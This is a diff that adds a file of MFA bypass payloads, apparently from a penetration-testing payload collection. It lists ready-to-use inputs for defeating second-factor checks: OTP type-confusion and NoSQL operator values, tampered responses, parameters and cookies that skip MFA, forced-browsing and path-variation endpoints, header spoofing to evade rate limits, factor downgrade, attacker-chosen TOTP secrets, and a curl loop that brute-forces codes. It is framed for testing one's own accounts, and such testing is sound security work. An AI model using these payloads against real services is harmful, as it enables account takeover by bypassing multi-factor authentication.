@@ -1,0 +1,231 @@
+# MFA Bypass Payloads
+# Fragments for the second-factor verification request. Use test accounts you own. otp is the parameter name; use the target's.
+
+# Code value variants (the validator may treat these as a match, empty or an error that skips the check)
+otp=0
+otp=00000
+otp=0000000
+otp=-1
+otp=000000.0
+otp=1e5
+otp=undefined
+otp=true
+otp=false
+otp=NaN
+otp=%00
+otp=000000%00
+otp=000000%0a
+otp=000%20000
+otp=١٢٣٤٥٦
+otp[]=
+otp[]=123456&otp[]=654321
+otp[0]=000000&otp[1]=111111
+otp[$ne]=
+otp[$gt]=
+otp.__proto__=x
+OTP=123456
+Otp=123456
+code=123456
+verification_code=123456
+mfa_code=123456
+totp=123456
+
+# JSON bodies (type confusion and multiple guesses in one request)
+{"otp":null}
+{"otp":[]}
+{"otp":{}}
+{"otp":["000000","111111","222222","333333","444444","555555","666666","777777","888888","999999"]}
+{"otp":{"$ne":"000000"}}
+{"otp":"123456","otp":"000000"}
+{"otp":"","remember":true}
+{"code":"123456","mfa":false}
+{"code":"123456","skip_mfa":true}
+{"code":"123456","verified":true}
+{"code":"123456","user_id":"OTHER_TEST_USER_ID"}
+{"code":"123456","email":"other-test@example.test"}
+
+# Response manipulation (edit the server response in a proxy and observe whether the client proceeds)
+HTTP/1.1 200 OK with body {"success":true}
+{"success":false} -> {"success":true}
+{"verified":false} -> {"verified":true}
+{"mfa_required":true} -> {"mfa_required":false}
+{"status":"error","code":401} -> {"status":"ok","code":200}
+{"twoFactor":true} -> {"twoFactor":false}
+HTTP/1.1 401 Unauthorized -> HTTP/1.1 200 OK
+HTTP/1.1 403 Forbidden -> HTTP/1.1 200 OK
+HTTP/1.1 302 Found Location: /2fa -> HTTP/1.1 302 Found Location: /dashboard
+
+# Parameter and request tampering on the login or verify request
+mfa=false
+require_2fa=false
+two_factor=false
+2fa=0
+skip_2fa=1
+skip=true
+remember_me=true
+trusted_device=true
+trust_device=1
+device_trusted=true
+Cookie: mfa_passed=true
+Cookie: two_factor_verified=1
+Cookie: 2fa=done
+Cookie: remember_device=1
+Cookie: device_id=ANY_VALUE
+X-MFA-Verified: true
+X-2FA-Passed: 1
+X-Skip-MFA: 1
+
+# Forced browsing and half-authenticated session use (send with the session from the password step only)
+GET /dashboard
+GET /account
+GET /account/settings
+GET /api/me
+GET /api/v1/user
+GET /api/v1/profile
+GET /api/v1/account
+GET /settings/security
+GET /home
+GET /app
+GET /api/me/devices
+POST /api/me/email
+POST /api/me/password
+
+# Endpoint and version differences (compare whether the factor is enforced)
+GET /api/v1/me
+GET /api/v2/me
+GET /api/v3/me
+GET /api/mobile/me
+GET /mobile/api/me
+GET /legacy/me
+GET /internal/me
+GET /m/dashboard
+GET /amp/dashboard
+POST /login/api
+POST /api/login
+POST /api/v1/login
+POST /api/v1/auth/token
+POST /oauth/token
+POST /token
+POST /sso/login
+POST /login?mfa=0
+POST /login?step=2
+POST /login?step=3
+
+# Method and path variations of the verify endpoint
+GET /verify?code=000000
+GET /2fa/verify?code=000000
+PUT /2fa/verify
+PATCH /2fa/verify
+POST /2fa/verify/
+POST /2fa//verify
+POST /2fa/verify/..;/
+POST /2fa/verify%20
+POST /2fa/verify.json
+POST /2fa/Verify
+POST /2FA/verify
+POST /2fa/verify;x=y
+POST /2fa/verify?x=1
+POST /api/2fa/verify
+POST /api/v1/2fa/verify
+POST /api/v2/2fa/verify
+
+# Code reuse, expiry and binding checks (sequence descriptions: run on test accounts)
+# Use a valid code twice and observe whether the second use is accepted
+# Use a code issued for session A in session B
+# Use an old code after a newer one has been requested
+# Use a code after its stated expiry
+# Use a code issued for another account that you also own
+# Request a code, change the email or phone, then submit the old code
+# Submit the same valid code concurrently in two requests
+
+# Brute-force resistance checks on the verify and resend endpoints (own account; cap the attempts)
+# seq -w 0 999999 | head -n 50 | xargs -P 1 -I{} curl -s -o /dev/null -w "{} %{http_code}\n" -X POST https://app.example.test/2fa/verify -d "otp={}" -b "session=TEST_SESSION"
+# Compare status code, body length and timing of the 1st, 10th, 50th and 100th wrong attempt for blocking or lockout
+# Change the IP-related headers between attempts to see whether the counter is per client
+# Request a new code between attempts to see whether the counter resets
+# Test the resend endpoint for unlimited sends (mail or SMS flooding) and for the same code being re-sent
+
+# Rate-limit evasion on the verify step (see Rate-Limit-Bypass for more)
+X-Forwarded-For: 203.0.113.7
+X-Originating-IP: 203.0.113.8
+X-Remote-Addr: 203.0.113.9
+X-Client-IP: 203.0.113.10
+X-Real-IP: 203.0.113.11
+
+# Code disclosure in transport and logs (look for the code in these places)
+# The verify or resend response body
+# Response headers such as X-OTP or X-Debug
+# The redirect URL or query string (Referer exposure to third parties)
+# Client-side JavaScript, local storage and error messages
+# Email or SMS content in a link with the code in the URL
+# Logging endpoints and debug pages
+
+# OAuth, SSO and alternate login paths (log in with the same account and check whether the factor is requested)
+GET /auth/google
+GET /auth/github
+GET /auth/microsoft
+GET /auth/saml
+GET /login/sso
+GET /oauth/authorize?client_id=TEST_CLIENT&response_type=code
+POST /api/login?provider=password
+POST /api/key/login
+Authorization: Bearer LONG_LIVED_API_TOKEN
+Authorization: Basic BASE64_OF_TEST_USER_AND_PASSWORD
+X-API-Key: TEST_API_KEY
+
+# Recovery and reset flows (check whether they remove or skip the factor)
+POST /password-reset/confirm
+POST /account/recover
+POST /account/unlock
+POST /account/email/change
+POST /2fa/disable
+POST /2fa/reset
+POST /2fa/recovery
+POST /2fa/backup-codes
+POST /2fa/backup-codes/regenerate
+POST /2fa/enroll
+POST /2fa/enroll/confirm
+DELETE /2fa
+DELETE /api/me/2fa
+PUT /api/me/2fa?enabled=false
+
+# Enrolment and removal without re-authentication (should require the current password or a valid factor)
+POST /2fa/disable with only a session cookie and no password field
+POST /2fa/enroll with a victim-controlled TOTP secret in the request body
+POST /2fa/enroll/confirm without a prior valid enrolment start
+{"enabled":false}
+{"secret":"JBSWY3DPEHPK3PXP"}
+{"secret":"ATTACKERCHOSENSECRET"}
+
+# Backup and recovery codes (own account)
+# Request codes repeatedly and check that old codes are invalidated
+# Check that codes have enough entropy and a limited number of attempts
+# Check that a used code is rejected on the second attempt
+# Check whether backup codes can be viewed again after enrolment without re-authentication
+
+# Factor downgrade and fallback
+POST /2fa/method with {"method":"sms"}
+POST /2fa/method with {"method":"email"}
+POST /2fa/method with {"method":"none"}
+POST /login with {"mfa_method":"email"}
+POST /webauthn/fallback
+POST /2fa/use-another-method
+
+# Time-based codes (TOTP) validation window and clock checks (own account)
+# Submit the previous and next 30-second window codes and note how many windows are accepted
+# Submit a code from several minutes earlier and several minutes later
+# Submit the same TOTP code again within the same window after a successful use
+
+# Race conditions on verification (single-packet or parallel sends; see Race-Conditions)
+# Send many verify requests with different guesses at the same instant
+# Send verify and a state-changing request at the same instant to see whether the change succeeds before the check completes
+
+# Push-notification and number-matching fatigue checks (own devices)
+# Trigger repeated prompts and check for throttling and for context such as location and application name
+# Check whether the number-matching code appears in the request or response before approval
+
+# Session handling around the factor
+# Session fixation: set the session identifier before login and check that it changes after the second factor
+# Check that the session issued after the password step cannot call privileged APIs
+# Check that the session is invalidated after too many failed code attempts
+# Check that a logout ends the half-authenticated session
